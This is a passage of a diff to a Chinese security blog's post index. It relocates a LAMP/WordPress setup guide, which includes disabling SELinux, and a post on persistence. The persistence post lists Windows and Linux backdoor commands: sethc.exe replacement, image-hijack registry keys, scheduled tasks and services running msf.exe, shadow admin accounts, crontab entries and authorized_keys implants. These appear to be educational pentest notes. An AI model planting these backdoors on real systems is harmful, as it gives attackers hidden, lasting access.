-<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
-<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
-
-<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
-
-<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
-<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
-
-<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
-<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
-
-<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>
-
-<p>（注意！wp-config.php 删除可重装wp网站）</p>
-<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
-
-<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
-<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
@@ -7519,6 +7475,50 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建LAMP环境</title>
+    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
+<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
+
+<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
+
+<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
+
+<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
+<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
+
+<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
+<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+
+<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>
+
+<p>（注意！wp-config.php 删除可重装wp网站）</p>
+<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+
+<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
+<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
@@ -8068,77 +8068,6 @@
       </tags>
   </entry>
   <entry>
-    <title>权限维持</title>
-    <url>/article/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
-    <content><![CDATA[<p>Windows权限维持</p>
-<p>后门：绕过安全措施获取对程序或系统放弃那个文权限的方法，是一个留在目标主机上的软件，可以使攻击者随时与目标主机进行连接。</p>
-<p>常见后门：</p>
-<table>
-<thead>
-<tr>
-<th>分类</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>shift后门</td>
-<td>连按5次shift键，会以system权限启动粘滞键  <br>粘滞键的位置：  C:\windows\system32\sethc.exe     <br><br>利用  <br>用  cmd.exe或远控木马替换 windows\system32 目录下的粘滞键sethc.exe  如果出现拒绝访问，则需要修改权限：<br>  <code>takeown /f c:\windows\system32\sethc.exe /a /r /d y   cacls  c:\windows\system32\*.* /T</code>      <br><br>防御：  <br>1、 禁用该  sethc.exe 功能 或者在 “控制面板”中关闭“连续按5次shift键时启用粘滞键选项”  <br>2、使用权限约束  sethc.exe，使任何人都不能访问它</td>
-</tr>
-<tr>
-<td>映像劫持</td>
-<td>在高版本的windows版本中替换的文件受到了系统的保护，所以需要进行  “映像劫持”     <br><br>利用：  <br>注册表位置：  <br>1、在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Image File Execution Option</code> 下添加一个项 sethc.exe  <br>2、在新建的项中添加debugger键，键值设置为恶意程序的路径  或cmd直接添加、双击导出文件运行。    <br><br>其他可以劫持的程序：  <br>设置中心：C:\Windows\System32\utilman.exe，<br>快捷键：Windows+U  <br>屏幕键盘：C:\Windows\System32\osk.exe  <br>放大镜：C:\Windows\System32\Magnify.exe  ，<br>快捷键：Windows+加减号</td>
-</tr>
-<tr>
-<td>计划任务</td>
-<td>windows7-：<br>at，打开一个后台进程  每天定时执行：  <br><code>at 24:00:00 /every:M,T,W,TH,F,S,SU  &quot;c:\\windwos\\system32\\atd.exe&quot;</code>  <br><br>windows8+：<br>schtasks，将定时的任务在前台执行  系统启动时运行  <br><code>schtasks /create /tn &quot;chrom&quot; /tr cmd.exe  /sc minute /mo 1</code>   每分钟执行一次cmd  <br><br>命令行乱码：  <br>chcp 936 GBK编码  <br>chcp 65001 utf编码</td>
-</tr>
-<tr>
-<td>开机启动</td>
-<td>注册表启动项  <br>1、 regedit打开注册表：<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</code>  <br>2、 添加一个键值类型为REG_SZ  <br>3、 在数据中填写需要运行程序的路径  <br>4、cmd.exe  实现了开机后自启动     其他开机启动项（需要用户登录生效，退出则失效）  <br><code>C:\ProgramData\Microsoft\Windows\Start  Menu\Programs\StartUp</code>  <br><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  </code></td>
-</tr>
-<tr>
-<td>注册服务</td>
-<td><code>sc create jihua binPath= &quot;c:\\msf.exe&quot; start= auto</code>(注意=后均有空格，不可删除)  <br>EasyServerce、nssm等工具，自动注册服务，且有守护进程</td>
-</tr>
-<tr>
-<td>影子账户</td>
-<td>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式找不到这个用户的信息。影子账户可以获得管理员的权限，且不容易被发现     <br><br>利用  <br>1、创建一个隐藏用户  添加的test$用户在net user命令下是看不到的，但是在管理界面下可以看到  <br>2、在注册表中打开  HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/ 选项，点击Names菜单，  可以看到计算机中所有的账户名称  <br>注意：如果进入SAM后无法再看到里面的子选项，需要给予administrators完权控制权限，并重新进入注册表  <br>3、将administrator用户对应的项中的F值复制到 test$ 对应项中的F值，然后保存  <br>4、将Names中的 test$ 和 对应的 Users 中的目录进行右键导出  <br>5、将创建的隐藏账号 test$ 删除  <br>6、双击刚才导出的两个注册表，影子账户就创建完成了  <br>7、查看影子账户是否创建成功，只有在注册表中才能查看该账户</td>
-</tr>
-</tbody></table>
-<p>Linux权限维持</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>计划任务</td>
-<td>crontab -e 写入定时任务  *  * */1 * * /bin/msf</td>
-</tr>
-<tr>
-<td>开机启动项</td>
-<td>centos中  /etc/rc.local为开机启动项  将程序放置此文件夹即可     <br>/etc/profile为用户启动文件夹</td>
-</tr>
-<tr>
-<td>ssh公钥</td>
-<td>将公钥写入/root/.ssh/authorized_keys</td>
-</tr>
-<tr>
-<td>第三方守护进程</td>
-<td>yum  install supervisor</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>权限维持</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含漏洞</title>
     <url>/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为文件包含。但是如果未对动态调用的变量做出限制（如同SQL注入漏洞一样，未对客户端输入进行过滤，从而造成违背开发人员本意的语句执行–这里是指调用了恶意文件），客户端可以调用任意文件，则造成了文件包含漏洞。</p>
@@ -8307,6 +8236,77 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>权限维持</title>
+    <url>/article/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<p>Windows权限维持</p>
+<p>后门：绕过安全措施获取对程序或系统放弃那个文权限的方法，是一个留在目标主机上的软件，可以使攻击者随时与目标主机进行连接。</p>
+<p>常见后门：</p>
+<table>
+<thead>
+<tr>
+<th>分类</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>shift后门</td>
+<td>连按5次shift键，会以system权限启动粘滞键  <br>粘滞键的位置：  C:\windows\system32\sethc.exe     <br><br>利用  <br>用  cmd.exe或远控木马替换 windows\system32 目录下的粘滞键sethc.exe  如果出现拒绝访问，则需要修改权限：<br>  <code>takeown /f c:\windows\system32\sethc.exe /a /r /d y   cacls  c:\windows\system32\*.* /T</code>      <br><br>防御：  <br>1、 禁用该  sethc.exe 功能 或者在 “控制面板”中关闭“连续按5次shift键时启用粘滞键选项”  <br>2、使用权限约束  sethc.exe，使任何人都不能访问它</td>
+</tr>
+<tr>
+<td>映像劫持</td>
+<td>在高版本的windows版本中替换的文件受到了系统的保护，所以需要进行  “映像劫持”     <br><br>利用：  <br>注册表位置：  <br>1、在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Image File Execution Option</code> 下添加一个项 sethc.exe  <br>2、在新建的项中添加debugger键，键值设置为恶意程序的路径  或cmd直接添加、双击导出文件运行。    <br><br>其他可以劫持的程序：  <br>设置中心：C:\Windows\System32\utilman.exe，<br>快捷键：Windows+U  <br>屏幕键盘：C:\Windows\System32\osk.exe  <br>放大镜：C:\Windows\System32\Magnify.exe  ，<br>快捷键：Windows+加减号</td>
+</tr>
+<tr>
+<td>计划任务</td>
+<td>windows7-：<br>at，打开一个后台进程  每天定时执行：  <br><code>at 24:00:00 /every:M,T,W,TH,F,S,SU  &quot;c:\\windwos\\system32\\atd.exe&quot;</code>  <br><br>windows8+：<br>schtasks，将定时的任务在前台执行  系统启动时运行  <br><code>schtasks /create /tn &quot;chrom&quot; /tr cmd.exe  /sc minute /mo 1</code>   每分钟执行一次cmd  <br><br>命令行乱码：  <br>chcp 936 GBK编码  <br>chcp 65001 utf编码</td>
+</tr>
+<tr>
+<td>开机启动</td>
+<td>注册表启动项  <br>1、 regedit打开注册表：<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</code>  <br>2、 添加一个键值类型为REG_SZ  <br>3、 在数据中填写需要运行程序的路径  <br>4、cmd.exe  实现了开机后自启动     其他开机启动项（需要用户登录生效，退出则失效）  <br><code>C:\ProgramData\Microsoft\Windows\Start  Menu\Programs\StartUp</code>  <br><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  </code></td>
+</tr>
+<tr>
+<td>注册服务</td>
+<td><code>sc create jihua binPath= &quot;c:\\msf.exe&quot; start= auto</code>(注意=后均有空格，不可删除)  <br>EasyServerce、nssm等工具，自动注册服务，且有守护进程</td>
+</tr>
+<tr>
+<td>影子账户</td>
+<td>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式找不到这个用户的信息。影子账户可以获得管理员的权限，且不容易被发现     <br><br>利用  <br>1、创建一个隐藏用户  添加的test$用户在net user命令下是看不到的，但是在管理界面下可以看到  <br>2、在注册表中打开  HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/ 选项，点击Names菜单，  可以看到计算机中所有的账户名称  <br>注意：如果进入SAM后无法再看到里面的子选项，需要给予administrators完权控制权限，并重新进入注册表  <br>3、将administrator用户对应的项中的F值复制到 test$ 对应项中的F值，然后保存  <br>4、将Names中的 test$ 和 对应的 Users 中的目录进行右键导出  <br>5、将创建的隐藏账号 test$ 删除  <br>6、双击刚才导出的两个注册表，影子账户就创建完成了  <br>7、查看影子账户是否创建成功，只有在注册表中才能查看该账户</td>
+</tr>
+</tbody></table>
+<p>Linux权限维持</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>计划任务</td>
+<td>crontab -e 写入定时任务  *  * */1 * * /bin/msf</td>
+</tr>
+<tr>
+<td>开机启动项</td>
+<td>centos中  /etc/rc.local为开机启动项  将程序放置此文件夹即可     <br>/etc/profile为用户启动文件夹</td>
+</tr>
+<tr>
+<td>ssh公钥</td>
+<td>将公钥写入/root/.ssh/authorized_keys</td>
+</tr>
+<tr>
+<td>第三方守护进程</td>
+<td>yum  install supervisor</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>权限维持</tag>
       </tags>
   </entry>
   <entry>
